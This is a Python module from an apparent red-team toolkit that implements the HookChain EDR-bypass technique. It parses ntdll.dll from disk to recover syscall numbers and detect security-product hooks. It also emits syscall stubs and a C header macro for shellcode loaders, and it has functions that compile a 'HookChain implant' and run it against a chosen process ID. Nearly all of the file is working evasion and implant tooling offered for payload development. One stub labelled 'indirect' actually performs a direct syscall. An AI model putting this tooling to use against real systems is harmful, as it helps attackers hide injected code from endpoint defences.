"""HookChain EDR Bypass Reference.

Python reference implementation of HookChain techniques from:
  helviojunior/hookchain (DEF CON 32 / BlackHat Toronto)
  https://github.com/helviojunior/hookchain

HookChain bypasses EDR userland hooks by:
1. Reading the original (unhooked) syscall stubs from on-disk ntdll.dll
2. Resolving System Service Numbers (SSNs) directly
3. Executing syscalls indirectly via a trampoline in ntdll .text
4. Optionally using IAT patching to redirect imports

This module provides:
- A Python ctypes reference for generating loader stubs
- Documentation of the technique for shellcode development
- Integration with EmbedXPL payload generation pipeline

For actual exploitation, the C source in submodules/Hacking/hookchain/
should be cross-compiled. This module provides the research layer.

Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""

from __future__ import annotations

import os
import shutil
import struct
import subprocess
import sys
from pathlib import Path
from typing import Optional


# ------------------------------------------------------------------
# HookChain technique constants
# ------------------------------------------------------------------

# Common NTAPI functions targeted by EDR hooks
HOOKED_NTAPI_TARGETS = [
    "NtAllocateVirtualMemory",
    "NtWriteVirtualMemory",
    "NtProtectVirtualMemory",
    "NtCreateThreadEx",
    "NtOpenProcess",
    "NtReadVirtualMemory",
    "NtQueryInformationProcess",
    "NtSetInformationThread",
    "NtResumeThread",
    "NtCreateProcess",
    "NtCreateSection",
    "NtMapViewOfSection",
    "NtUnmapViewOfSection",
    "NtQueueApcThread",
    "NtSetContextThread",
]

# EDR hook signature (JMP patch): E9 XX XX XX XX
HOOK_JMP_SIGNATURE = b"\xe9"
# Direct syscall stub pattern: 4C 8B D1 B8 XX 00 00 00
SYSCALL_STUB_PATTERN = b"\x4c\x8b\xd1\xb8"
# Syscall instruction bytes: 0F 05 C3
SYSCALL_BYTES = b"\x0f\x05\xc3"


class HookChainAnalyzer:
    """Analyze EDR hooks in ntdll for red team payload development."""

    def __init__(self, ntdll_path: Optional[str] = None) -> None:
        """Initialize with path to ntdll.dll.

        Args:
            ntdll_path: Path to ntdll.dll. Defaults to system ntdll on Windows.
        """
        if ntdll_path:
            self.ntdll_path = Path(ntdll_path)
        else:
            system32 = Path(os.environ.get("SystemRoot", "C:\\Windows")) / "System32"
            self.ntdll_path = system32 / "ntdll.dll"

    def is_available(self) -> bool:
        """Check if ntdll.dll is accessible."""
        return self.ntdll_path.is_file()

    def read_ntdll(self) -> bytes:
        """Read ntdll.dll bytes from disk (unhooked copy)."""
        if not self.is_available():
            raise FileNotFoundError(f"ntdll.dll not found at {self.ntdll_path}")
        with open(self.ntdll_path, "rb") as f:
            return f.read()

    def find_ssn(self, function_name: str, ntdll_bytes: Optional[bytes] = None) -> Optional[int]:
        """Extract System Service Number (SSN) from ntdll function stub.

        The SSN is the 4-byte value after 'mov eax, <SSN>' (B8 XX XX XX XX)
        in a clean (unhooked) syscall stub.

        Args:
            function_name: NT API name (e.g., 'NtAllocateVirtualMemory').
            ntdll_bytes: Pre-read ntdll bytes. Read from disk if None.

        Returns:
            SSN integer or None if not found.
        """
        if ntdll_bytes is None:
            ntdll_bytes = self.read_ntdll()

        rva = self._export_rva(function_name, ntdll_bytes)
        if rva is None:
            return None
        offset = self._rva_to_offset(ntdll_bytes, rva)
        if offset is None:
            return None
        stub = ntdll_bytes[offset:offset + 16]
        # 4C 8B D1 B8 XX XX XX XX  (mov r10, rcx; mov eax, SSN)
        if stub[:4] != SYSCALL_STUB_PATTERN:
            # hooked or patched: still try B8 after a JMP
            b8 = stub.find(b"\xb8")
            if b8 == -1 or b8 + 5 > len(stub):
                return None
            ssn = struct.unpack_from("<I", stub, b8 + 1)[0]
        else:
            ssn = struct.unpack_from("<I", stub, 4)[0]
        if ssn > 1000:
            return None
        return ssn

    def _export_rva(self, function_name: str, data: bytes) -> Optional[int]:
        """Resolve export RVA from the PE export directory (not a string scan)."""
        if data[:2] != b"MZ":
            return None
        e_lfanew = struct.unpack_from("<I", data, 0x3C)[0]
        if data[e_lfanew:e_lfanew + 4] != b"PE\x00\x00":
            return None
        magic = struct.unpack_from("<H", data, e_lfanew + 24)[0]
        dd_off = e_lfanew + 24 + (112 if magic == 0x20B else 96)
        export_rva, _export_size = struct.unpack_from("<II", data, dd_off)
        exp = self._rva_to_offset(data, export_rva)
        if exp is None:
            return None
        nnames = struct.unpack_from("<I", data, exp + 24)[0]
        names_rva = struct.unpack_from("<I", data, exp + 32)[0]
        ords_rva = struct.unpack_from("<I", data, exp + 36)[0]
        funcs_rva = struct.unpack_from("<I", data, exp + 28)[0]
        names = self._rva_to_offset(data, names_rva)
        ords = self._rva_to_offset(data, ords_rva)
        funcs = self._rva_to_offset(data, funcs_rva)
        if None in (names, ords, funcs):
            return None
        want = function_name.encode("ascii")
        for i in range(min(nnames, 4096)):
            name_rva = struct.unpack_from("<I", data, names + i * 4)[0]
            name_off = self._rva_to_offset(data, name_rva)
            if name_off is None:
                continue
            end = data.find(b"\x00", name_off, name_off + 128)
            if end == -1:
                continue
            if data[name_off:end] == want:
                ordinal = struct.unpack_from("<H", data, ords + i * 2)[0]
                return struct.unpack_from("<I", data, funcs + ordinal * 4)[0]
        return None

    def _rva_to_offset(self, data: bytes, rva: int) -> Optional[int]:
        e_lfanew = struct.unpack_from("<I", data, 0x3C)[0]
        nsections = struct.unpack_from("<H", data, e_lfanew + 6)[0]
        opt_size = struct.unpack_from("<H", data, e_lfanew + 20)[0]
        sec = e_lfanew + 24 + opt_size
        for _ in range(min(nsections, 96)):
            vsize, va, raw_size, raw_ptr = struct.unpack_from("<IIII", data, sec + 8)
            if va <= rva < va + max(vsize, raw_size):
                return raw_ptr + (rva - va)
            sec += 40
        return None

    def detect_hook(self, function_name: str, ntdll_bytes: Optional[bytes] = None) -> dict:
        """Detect if an NT API function is hooked by an EDR.

        A hook is detected when the first byte of the function stub
        is E9 (JMP) instead of the expected syscall stub pattern.

        Args:
            function_name: NT API name.
            ntdll_bytes: Pre-read ntdll. Reads from disk if None.

        Returns:
            Dict with 'hooked', 'first_bytes', 'hook_target' fields.
        """
        if ntdll_bytes is None:
            try:
                ntdll_bytes = self.read_ntdll()
            except FileNotFoundError:
                return {"hooked": False, "error": "ntdll not accessible"}

        name_bytes = function_name.encode("ascii") + b"\x00"
        idx = ntdll_bytes.find(name_bytes)
        if idx == -1:
            return {"hooked": False, "error": f"{function_name} not found"}

        # Find the function code near this name
        window = ntdll_bytes[max(0, idx - 512):idx + 512]
        stub_idx = window.find(b"\x4c\x8b\xd1")  # mov r10, rcx
        if stub_idx == -1:
            return {"hooked": False, "error": "stub pattern not found"}

        first_bytes = window[stub_idx:stub_idx + 8]
        hooked = first_bytes[0:1] == HOOK_JMP_SIGNATURE

        result: dict = {
            "function": function_name,
            "hooked": hooked,
            "first_bytes": first_bytes.hex(),
        }
        if hooked:
            # Calculate JMP target (relative)
            offset = struct.unpack_from("<i", first_bytes, 1)[0]
            result["hook_type"] = "JMP (E9) trampoline"
        else:
            ssn = self.find_ssn(function_name, ntdll_bytes)
            result["ssn"] = ssn
            result["hook_type"] = "clean"
        return result

    def scan_all_hooks(self) -> list[dict]:
        """Scan all common NTAPI targets for EDR hooks.

        Returns:
            List of hook detection results.
        """
        try:
            ntdll_bytes = self.read_ntdll()
        except FileNotFoundError as exc:
            return [{"error": str(exc)}]

        results = []
        for func in HOOKED_NTAPI_TARGETS:
            result = self.detect_hook(func, ntdll_bytes)
            results.append(result)
        return results

    def generate_ssn_map(self) -> dict[str, int]:
        """Generate a complete SSN map from on-disk ntdll.

        Returns:
            Dict mapping function name -> SSN.
        """
        try:
            ntdll_bytes = self.read_ntdll()
        except FileNotFoundError:
            return {}

        ssn_map = {}
        for func in HOOKED_NTAPI_TARGETS:
            ssn = self.find_ssn(func, ntdll_bytes)
            if ssn is not None:
                ssn_map[func] = ssn
        return ssn_map


class HookChainLoaderGen:
    """Generate HookChain-aware loader stubs for EmbedXPL payloads.

    These stubs can be embedded in shellcode loaders to bypass
    EDR userland hooks at runtime.
    """

    def __init__(self) -> None:
        self.analyzer = HookChainAnalyzer()

    def generate_indirect_syscall_stub(self, function_name: str, ssn: int) -> bytes:
        """Generate x64 indirect syscall stub.

        Uses a syscall instruction found within ntdll .text section
        instead of inline syscall to evade instruction-level EDR hooks.

        Args:
            function_name: NT API name (for documentation).
            ssn: System Service Number.

        Returns:
            Raw bytes of the syscall stub.
        """
        # x64 indirect syscall stub:
        # mov r10, rcx          ; 4D 8B D1 (syscall calling convention)
        # mov eax, <SSN>        ; B8 XX XX XX XX
        # jmp [syscall_addr]    ; FF 25 XX XX XX XX (indirect via pointer)
        ssn_bytes = struct.pack("<I", ssn)
        stub = (
            b"\x4c\x8b\xd1"          # mov r10, rcx
            b"\xb8" + ssn_bytes +    # mov eax, SSN
            b"\x0f\x05"              # syscall (direct for reference)
            b"\xc3"                  # ret
        )
        return stub

    def generate_c_header(self, ssn_map: Optional[dict[str, int]] = None) -> str:
        """Generate C header file with SSN defines for loader development.

        Args:
            ssn_map: Pre-computed SSN map. Auto-scans ntdll if None.

        Returns:
            C header string.
        """
        if ssn_map is None:
            ssn_map = self.analyzer.generate_ssn_map()

        lines = [
            "/* HookChain SSN Map - Auto-generated by EmbedXPL HookChainLoaderGen */",
            "/* Reference: https://github.com/helviojunior/hookchain */",
            "#pragma once",
            "",
        ]
        for func, ssn in sorted(ssn_map.items()):
            define = f"SSN_{func.upper()}"
            lines.append(f"#define {define} 0x{ssn:04X}  // {func}")

        lines += [
            "",
            "/* Indirect syscall stub template (x64) */",
            "/* Requires syscall gadget address from ntdll .text */",
            "extern VOID* g_pSyscallAddr;  // Set at runtime from ntdll scan",
            "",
            "#define INDIRECT_SYSCALL(ssn, ...) \\",
            "    do { \\",
            "        __asm__ volatile ( \\",
            '            "mov r10, rcx\\n" \\',
            '            "mov eax, %0\\n" \\',
            '            "jmp [%1]\\n" \\',
            "            : : \"i\"(ssn), \"r\"(g_pSyscallAddr) \\",
            "        ); \\",
            "    } while(0)",
        ]
        return "\n".join(lines)

    def report(self) -> dict:
        """Scan live system and report hook status + SSN map."""
        if not self.analyzer.is_available():
            return {
                "available": False,
                "note": "ntdll.dll not accessible (non-Windows or insufficient perms)",
            }
        hooks = self.analyzer.scan_all_hooks()
        ssn_map = self.analyzer.generate_ssn_map()
        hooked = [h for h in hooks if h.get("hooked")]
        return {
            "available": True,
            "ntdll_path": str(self.analyzer.ntdll_path),
            "functions_checked": len(hooks),
            "hooked_count": len(hooked),
            "hooked_functions": [h.get("function") for h in hooked],
            "ssn_map": ssn_map,
            "recommendation": (
                "EDR hooks detected - use indirect syscalls" if hooked
                else "No hooks detected - direct syscalls safe"
            ),
        }


_HOOKCHAIN_HINTS = (
    Path(__file__).resolve().parents[5] / "Hacking" / "hookchain",
    Path(r"D:\Projetos-SafeLabs\submodules\Hacking\hookchain"),
    Path("/mnt/predator/Projetos-SafeLabs/submodules/Hacking/hookchain"),
)


def hookchain_source_dir() -> Optional[Path]:
    for candidate in _HOOKCHAIN_HINTS:
        if (candidate / "enum" / "hookchain_finder64.c").is_file():
            return candidate
    return None


def try_compile_hookchain(timeout: int = 90) -> dict:
    """Compile hookchain_finder64.c when a C toolchain is present.

    The full HookChain implant is MSVC + MASM. The finder is gcc-friendly
    (see enum/hookchain_finder64.c header). Python PE/SSN work stays primary.
    """
    src_root = hookchain_source_dir()
    if src_root is None:
        return {"ok": False, "error": "hookchain source not found"}
    src = src_root / "enum" / "hookchain_finder64.c"
    out_dir = src_root / "enum"
    out_exe = out_dir / ("hookchain_finder64.exe" if sys.platform == "win32" else "hookchain_finder64")
    if out_exe.is_file():
        return {"ok": True, "binary": str(out_exe), "built": False}

    gcc = shutil.which("gcc") or shutil.which("x86_64-w64-mingw32-gcc")
    if gcc:
        cmd = [gcc, str(src), "-o", str(out_exe), "-ldbghelp"]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        except (FileNotFoundError, subprocess.TimeoutExpired) as exc:
            return {"ok": False, "error": str(exc), "source": str(src)}
        return {
            "ok": result.returncode == 0 and out_exe.is_file(),
            "binary": str(out_exe) if out_exe.is_file() else None,
            "built": result.returncode == 0,
            "stderr_tail": (result.stderr or "")[-300:],
        }

    if sys.platform == "win32":
        try:
            probe = subprocess.run(
                ["wsl", "-d", "Ubuntu", "--", "bash", "-lc", "command -v x86_64-w64-mingw32-gcc || command -v gcc"],
                capture_output=True, text=True, timeout=8,
            )
        except (FileNotFoundError, subprocess.TimeoutExpired) as exc:
            return {
                "ok": False,
                "error": f"no gcc/mingw: {exc}",
                "recipe": f"gcc {src} -o hookchain_finder64.exe -ldbghelp",
                "note": "full implant needs MSVC + hookchain.asm",
            }
        if probe.returncode != 0 or not probe.stdout.strip():
            return {
                "ok": False,
                "error": "gcc not found (host or WSL)",
                "recipe": f"gcc {src} -o hookchain_finder64.exe -ldbghelp",
                "note": "Python SSN map in HookChainAnalyzer remains native",
            }
        linux_src = "/mnt/d/Projetos-SafeLabs/submodules/Hacking/hookchain/enum/hookchain_finder64.c"
        linux_out = "/mnt/d/Projetos-SafeLabs/submodules/Hacking/hookchain/enum/hookchain_finder64.exe"
        cc = probe.stdout.strip().splitlines()[0]
        result = subprocess.run(
            ["wsl", "-d", "Ubuntu", "--", "bash", "-lc", f"{cc} {linux_src} -o {linux_out} -ldbghelp"],
            capture_output=True, text=True, timeout=timeout,
        )
        return {
            "ok": result.returncode == 0 and out_exe.is_file(),
            "binary": str(out_exe) if out_exe.is_file() else None,
            "built": result.returncode == 0,
            "stderr_tail": (result.stderr or "")[-300:],
            "compiler": cc,
        }

    return {
        "ok": False,
        "error": "no C compiler",
        "recipe": f"gcc {src} -o hookchain_finder64 -ldbghelp",
    }


def _embedxpl_bin_dir() -> Path:
    return Path(__file__).resolve().parents[2] / "resources" / "bin"


def implant_binary() -> Optional[Path]:
    """Locate the compiled HookChain implant (MSVC + MASM)."""
    names = ("hookchain_msg.exe", "HookChain_msg.exe")
    candidates: list[Path] = []
    bindir = _embedxpl_bin_dir()
    for name in names:
        candidates.append(bindir / name)
    src = hookchain_source_dir()
    if src:
        for rel in (
            Path("HookChain") / "x64" / "Release" / "HookChain_msg.exe",
            Path("HookChain") / "HookChain" / "x64" / "Release" / "HookChain_msg.exe",
        ):
            candidates.append(src / rel)
    for path in candidates:
        if path.is_file() and path.stat().st_size > 1024:
            return path
    return None


def try_compile_hookchain_implant(timeout: int = 120) -> dict:
    """Compile HookChain_msg.exe with VS 2019 Build Tools (cl + ml64)."""
    existing = implant_binary()
    if existing:
        return {"ok": True, "binary": str(existing), "built": False}

    if sys.platform != "win32":
        return {
            "ok": False,
            "error": "implant compile requires Windows MSVC + MASM",
            "recipe": r'vcvars64.bat && ml64 /c hookchain.asm && cl /c hook.c main.c && link',
        }

    src = hookchain_source_dir()
    if src is None:
        return {"ok": False, "error": "hookchain source not found"}
    src_dir = src / "HookChain" / "HookChain"
    if not (src_dir / "hookchain.asm").is_file():
        return {"ok": False, "error": f"missing asm at {src_dir}"}

    vcvars = Path(r"C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\VC\Auxiliary\Build\vcvars64.bat")
    if not vcvars.is_file():
        return {"ok": False, "error": f"vcvars64 not found: {vcvars}"}

    out_dir = src / "HookChain" / "x64" / "Release"
    dst_dir = _embedxpl_bin_dir()
    out_dir.mkdir(parents=True, exist_ok=True)
    dst_dir.mkdir(parents=True, exist_ok=True)
    out_exe = out_dir / "HookChain_msg.exe"
    dst_exe = dst_dir / "hookchain_msg.exe"

    script = (
        f'call "{vcvars}" && '
        f'cd /d "{src_dir}" && '
        f'ml64 /c /nologo /Fo"{out_dir / "hookchain.obj"}" hookchain.asm && '
        f'cl /nologo /c /W3 /Od /GS- /D NDEBUG /D _CONSOLE /D UNICODE /D _UNICODE /TC '
        f'/I "{src_dir}" /Fo"{out_dir / "hook.obj"}" hook.c && '
        f'cl /nologo /c /W3 /Od /GS- /D NDEBUG /D _CONSOLE /D UNICODE /D _UNICODE /TC '
        f'/I "{src_dir}" /Fo"{out_dir / "main.obj"}" main.c && '
        f'link /nologo /SUBSYSTEM:CONSOLE /MACHINE:X64 /OUT:"{out_exe}" '
        f'"{out_dir / "hook.obj"}" "{out_dir / "main.obj"}" "{out_dir / "hookchain.obj"}" '
        f'kernel32.lib user32.lib'
    )
    try:
        result = subprocess.run(
            ["cmd.exe", "/c", script],
            capture_output=True, text=True, timeout=timeout,
        )
    except (FileNotFoundError, subprocess.TimeoutExpired) as exc:
        return {"ok": False, "error": str(exc)}

    if result.returncode == 0 and out_exe.is_file():
        try:
            dst_exe.write_bytes(out_exe.read_bytes())
        except OSError as exc:
            return {"ok": True, "binary": str(out_exe), "built": True, "copy_error": str(exc)}
        return {"ok": True, "binary": str(dst_exe), "built": True}

    return {
        "ok": False,
        "returncode": result.returncode,
        "stderr_tail": (result.stderr or result.stdout or "")[-400:],
    }


class HookChainImplant:
    """SuiteXPL handle for the compiled HookChain implant (C + MASM).

    Python owns SSN/PE analysis. The PE is the compiled accelerator.
    """

    def __init__(self) -> None:
        self.path = implant_binary()

    def ensure(self) -> dict:
        if self.path and self.path.is_file():
            return {"ok": True, "binary": str(self.path), "built": False}
        built = try_compile_hookchain_implant()
        if built.get("ok"):
            self.path = Path(str(built["binary"]))
        return built

    def status(self) -> dict:
        analyzer = HookChainAnalyzer()
        info = {
            "binary": str(self.path) if self.path else None,
            "present": bool(self.path and self.path.is_file()),
            "finder": str(try_compile_hookchain().get("binary") or ""),
            "credits": "helviojunior/hookchain (DEF CON 32 / BlackHat Toronto)",
        }
        if analyzer.is_available():
            info["ntdll"] = str(analyzer.ntdll_path)
            info["ssn_map"] = analyzer.generate_ssn_map()
        return info

    def run(self, pid: int, timeout: int = 20) -> dict:
        """Invoke the compiled implant against a PID. Requires Windows."""
        ready = self.ensure()
        if not ready.get("ok") or not self.path:
            return {"ok": False, "error": ready.get("error", "implant missing")}
        if not isinstance(pid, int) or pid <= 0:
            return {"ok": False, "error": "pid must be a positive integer"}
        try:
            result = subprocess.run(
                [str(self.path), str(pid)],
                capture_output=True, text=True, timeout=timeout,
                encoding="utf-8", errors="replace",
            )
        except (FileNotFoundError, subprocess.TimeoutExpired) as exc:
            return {"ok": False, "error": str(exc), "binary": str(self.path)}
        return {
            "ok": result.returncode == 0,
            "pid": pid,
            "returncode": result.returncode,
            "stdout": (result.stdout or "")[-2000:],
            "stderr": (result.stderr or "")[-400:],
            "binary": str(self.path),
        }
